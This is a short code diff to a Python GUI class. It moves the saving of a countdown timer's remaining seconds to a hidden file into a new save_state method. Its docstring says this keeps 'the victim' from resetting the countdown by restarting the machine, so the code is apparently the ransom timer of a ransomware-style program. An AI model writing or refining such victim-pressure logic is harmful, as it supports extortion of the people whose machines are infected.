@@ -93,5 +93,10 @@ class GUI:
 				self.time.config(text=remaining)
 				self.countdown = self.countdown - 1
 			self.main.after(1000, self.counting)
-			with open('C:/Users/Public/.hours', 'w') as hours:
+			self.save_state(hours, minutes, seconds)
+
+	def save_state(self, h, m, s):
+		"""Saves the remaining time the moment it is called, 
+			preventing the victim from restarting the machine from restarting the counting progress."""
+		with open('C:/Users/Public/.hours', 'w') as hours:
 				hours.write(str((int(h)) * 3600 + (int(m)) * 60 + int(s)))
